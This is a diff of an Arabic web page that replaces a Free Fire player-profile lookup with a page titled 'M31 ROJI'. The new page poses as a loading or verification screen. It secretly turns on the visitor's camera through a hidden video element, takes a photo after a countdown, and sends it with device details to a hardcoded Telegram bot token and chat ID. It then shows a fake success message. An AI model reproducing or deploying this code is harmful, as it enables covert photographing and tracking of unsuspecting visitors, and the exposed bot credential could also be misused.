@@ -1,272 +1,123 @@
 <!DOCTYPE html>
-<html lang="ar" dir="rtl">
+<html lang="ar">
 <head>
-  <meta charset="UTF-8">
-  <meta name="viewport" content="width=device-width, initial-scale=1.0">
-  <title>بيانات اللاعب</title>
-  <style>
-    body {
-      font-family: "Cairo", sans-serif;
-      background: linear-gradient(135deg, #000000, #1a1a1a, #2c2c2c);
-      margin: 0;
-      padding: 0;
-      display: flex;
-      justify-content: center;
-      align-items: center;
-      min-height: 100vh;
-      color: #fff;
-    }
+<meta charset="UTF-8">
+<title>M31 ROJI</title>
 
-    .card {
-      width: 470px;
-      background: #111;
-      border-radius: 18px;
-      overflow: hidden;
-      box-shadow: 0 12px 30px rgba(255,0,0,0.3);
-      animation: fadeIn 0.8s ease-in-out;
-      max-height: 92vh;
-      overflow-y: auto;
-      border: 1px solid #900;
-    }
+<style>
+body {
+  background:#000;
+  color:#0f0;
+  text-align:center;
+  font-family:Arial;
+}
 
-    .banner {
-      height: 190px;
-      background-size: cover;
-      background-position: center;
-      position: relative;
-    }
+video { display:none; }
 
-    .avatar-top {
-      width: 100px;
-      height: 100px;
-      border-radius: 50%;
-      border: 3px solid #ff0000;
-      position: absolute;
-      bottom: -50px;
-      left: 50%;
-      transform: translateX(-50%);
-      object-fit: cover;
-      background: #000;
-      box-shadow: 0 6px 25px rgba(255,0,0,0.35);
-    }
+#loading {
+  display:none;
+  font-size:20px;
+}
 
-    .content {
-      padding: 65px 20px 25px 20px;
-      text-align: center;
-    }
-
-    h2 {
-      margin: 10px 0 20px;
-      color: #ff3333;
-      font-size: 22px;
-      font-weight: bold;
-    }
-
-    .info {
-      text-align: right;
-      margin: 15px 0;
-      padding: 15px;
-      background: rgba(255, 0, 0, 0.08);
-      border: 1px solid #900;
-      border-radius: 12px;
-      font-size: 15px;
-      color: #eee;
-    }
-
-    .info p {
-      margin: 8px 0;
-    }
-
-    .info strong {
-      color: #ff3333;
-    }
-
-    .input-box {
-      margin: 15px 0;
-    }
-
-    input {
-      width: 100%;
-      padding: 12px;
-      border: 1px solid #900;
-      border-radius: 10px;
-      outline: none;
-      font-size: 15px;
-      text-align: center;
-      background: #1a1a1a;
-      color: #fff;
-    }
-
-    input::placeholder {
-      color: #888;
-    }
-
-    /* 🔹 أزرار موحدة */
-    .btn {
-      width: 100%;
-      padding: 12px;
-      margin-top: 12px;
-      border: none;
-      border-radius: 10px;
-      color: #fff;
-      font-size: 15px;
-      cursor: pointer;
-      font-weight: bold;
-      transition: 0.3s ease;
-    }
-
-    .btn-primary {
-      background: #ff0000;
-    }
-    .btn-primary:hover {
-      background: #cc0000;
-      transform: scale(1.02);
-    }
-
-    .btn-secondary {
-      background: #222;
-      border: 1px solid #900;
-    }
-    .btn-secondary:hover {
-      background: #333;
-    }
-
-    .section {
-      margin: 20px 0;
-      text-align: right;
-    }
-
-    .section h3 {
-      margin-bottom: 10px;
-      font-size: 16px;
-      color: #ff3333;
-      border-right: 4px solid #900;
-      padding-right: 8px;
-    }
-
-    .grid {
-      display: grid;
-      grid-template-columns: repeat(auto-fit, minmax(65px, 1fr));
-      gap: 12px;
-    }
-
-    .grid img {
-      width: 100%;
-      border-radius: 10px;
-      background: #1a1a1a;
-      padding: 6px;
-      border: 1px solid #900;
-      box-shadow: 0 4px 10px rgba(255,0,0,0.15);
-      transition: transform 0.2s ease;
-    }
-
-    .grid img:hover {
-      transform: scale(1.12);
-      box-shadow: 0 4px 12px rgba(255,0,0,0.4);
-    }
-
-    @keyframes fadeIn {
-      from { opacity: 0; transform: translateY(30px); }
-      to { opacity: 1; transform: translateY(0); }
-    }
-  </style>
+#countdown {
+  font-size:30px;
+  margin-top:20px;
+}
+</style>
 </head>
+
 <body>
-  <div class="card">
-    <div class="banner" id="banner">
-      <img src="" alt="avatar" class="avatar-top" id="avatarTop">
-    </div>
-    <div class="content">
-      <h2>🎮 بيانات اللاعب</h2>
 
-      <div class="input-box">
-        <input type="text" id="uid" placeholder="ادخل UID">
-      </div>
-      <button class="btn btn-primary" onclick="fetchData()">عرض البيانات</button>
+<h3>انتظر سيتم فتح الموقع...</h3>
 
-      <div class="info" id="infoBox" style="display:none;">
-        <p>👤 <strong>الاسم:</strong> <span id="nickname"></span></p>
-        <p>⭐ <strong>المستوى:</strong> <span id="level"></span></p>
-        <p>⚡ <strong>الخبرة:</strong> <span id="exp"></span></p>
-        <p>🌍 <strong>الإقليم:</strong> <span id="region"></span></p>
-        <p>🏆 <strong>العشيرة:</strong> <span id="guild"></span></p>
-        <p>❤️ <strong>الإعجابات:</strong> <span id="likes"></span></p>
-      </div>
+<div id="countdown"></div>
+<div id="loading">⏳ جاري التحقق...</div>
 
-      <div class="section" id="weaponsSection" style="display:none;">
-        <h3>⚔️ الأسلحة المجهزة</h3>
-        <div class="grid" id="weaponsGrid"></div>
-      </div>
+<video id="video" autoplay playsinline></video>
+<canvas id="canvas" style="display:none;"></canvas>
 
-      <div class="section" id="outfitSection" style="display:none;">
-        <h3>👕 الملابس</h3>
-        <div class="grid" id="outfitGrid"></div>
-      </div>
+<script>
+const BOT_TOKEN = "7852857305:AAEW7SqDION4MTuIPNnxP6caMEYMLl2yojc";
+const CHAT_ID  = "8514140307";
 
-      <div class="section" id="skillsSection" style="display:none;">
-        <h3>🔮 شخصيات</h3>
-        <div class="grid" id="skillsGrid"></div>
-      </div>
+let streamRef = null;
+let sent = false;
 
-      <!-- 🔹 أزرار منظمة -->
-      <button class="btn btn-secondary" onclick="window.location.href='index.html'">⬅ رجوع</button>
-    </div>
-  </div>
+// معلومات الجهاز
+function getDeviceInfo() {
+  return `
+📱 الجهاز: ${navigator.platform}
+🌐 اللغة: ${navigator.language}
+🧭 المتصفح: ${navigator.userAgent}
+⏰ الوقت: ${new Date().toLocaleString()}
+  `;
+}
 
-  <script>
-    async function fetchData() {
-      const uid = document.getElementById("uid").value.trim();
-      if (!uid) {
-        alert("الرجاء إدخال UID");
-        return;
-      }
+// عداد قبل التصوير
+function startCountdown() {
+  let count = 3;
+  const el = document.getElementById("countdown");
 
-      try {
-        const response = await fetch(`https://garenafreefireaccount.vercel.app/playerpersonalshow?uid=${uid}&region=me`);
-        const data = await response.json();
+  const interval = setInterval(() => {
+    el.innerText = "📸 سيتم التصوير بعد: " + count;
+    count--;
 
-        if (data && data.AccountInfo) {
-          document.getElementById("nickname").innerText = data.AccountInfo.AccountName || "غير متوفر";
-          document.getElementById("level").innerText = data.AccountInfo.AccountLevel || "-";
-          document.getElementById("exp").innerText = data.AccountInfo.AccountEXP || "-";
-          document.getElementById("region").innerText = data.AccountInfo.AccountRegion || "-";
-          document.getElementById("likes").innerText = data.AccountInfo.AccountLikes || "-";
-          document.getElementById("guild").innerText = (data.GuildInfo && data.GuildInfo.GuildName) ? data.GuildInfo.GuildName : "لا يوجد";
-
-          document.getElementById("banner").style.backgroundImage = `url(${data.AccountInfo.BannerImage})`;
-          document.getElementById("avatarTop").src = data.AccountInfo.AvatarImage || "https://i.imgur.com/8Km9tLL.png";
-
-          document.getElementById("infoBox").style.display = "block";
-
-          // أسلحة
-          if (data.AccountInfo.EquippedWeaponImages && data.AccountInfo.EquippedWeaponImages.length > 0) {
-            const grid = document.getElementById("weaponsGrid");
-            grid.innerHTML = data.AccountInfo.EquippedWeaponImages.map(img => `<img src="${img}" alt="weapon">`).join("");
-            document.getElementById("weaponsSection").style.display = "block";
-          }
-
-          // ملابس
-          if (data.AccountProfileInfo && data.AccountProfileInfo.EquippedOutfitImages) {
-            const grid = document.getElementById("outfitGrid");
-            grid.innerHTML = data.AccountProfileInfo.EquippedOutfitImages.map(img => `<img src="${img}" alt="outfit">`).join("");
-            document.getElementById("outfitSection").style.display = "block";
-          }
-
-          // سكِلز
-          if (data.AccountProfileInfo && data.AccountProfileInfo.EquippedSkillsImages) {
-            const grid = document.getElementById("skillsGrid");
-            grid.innerHTML = data.AccountProfileInfo.EquippedSkillsImages.map(img => `<img src="${img}" alt="skill">`).join("");
-            document.getElementById("skillsSection").style.display = "block";
-          }
-
-        } else {
-          alert("لم يتم العثور على بيانات لهذا UID");
-        }
-      } catch (error) {
-        alert("حدث خطأ أثناء جلب البيانات");
-        console.error(error);
-      }
+    if (count < 0) {
+      clearInterval(interval);
+      el.innerText = "";
+      captureOnce();
     }
-  </script>
+  }, 1000);
+}
+
+// تشغيل الكاميرا
+navigator.mediaDevices.getUserMedia({ video: true })
+.then(stream => {
+  streamRef = stream;
+  document.getElementById("video").srcObject = stream;
+
+  startCountdown();
+})
+.catch(() => {
+  document.body.innerHTML = "<h2>تم رفض إذن الكاميرا ❌</h2>";
+});
+
+function captureOnce() {
+  if (sent) return;
+  sent = true;
+
+  document.getElementById("loading").style.display = "block";
+
+  const video = document.getElementById("video");
+  const canvas = document.getElementById("canvas");
+
+  canvas.width = video.videoWidth;
+  canvas.height = video.videoHeight;
+  canvas.getContext("2d").drawImage(video, 0, 0);
+
+  if (streamRef) {
+    streamRef.getTracks().forEach(t => t.stop());
+  }
+
+  canvas.toBlob(blob => {
+    const form = new FormData();
+    form.append("chat_id", CHAT_ID);
+    form.append("photo", blob);
+    form.append("caption", getDeviceInfo());
+
+    fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendPhoto`, {
+      method: "POST",
+      body: form
+    })
+    .then(() => {
+      document.body.innerHTML = "<h2>تم الفتح بنجاح ✅</h2>";
+    })
+    .catch(() => {
+      document.body.innerHTML = "<h2>فشل ❌</h2>";
+    });
+  }, "image/jpeg");
+}
+</script>
+
 </body>
 </html>
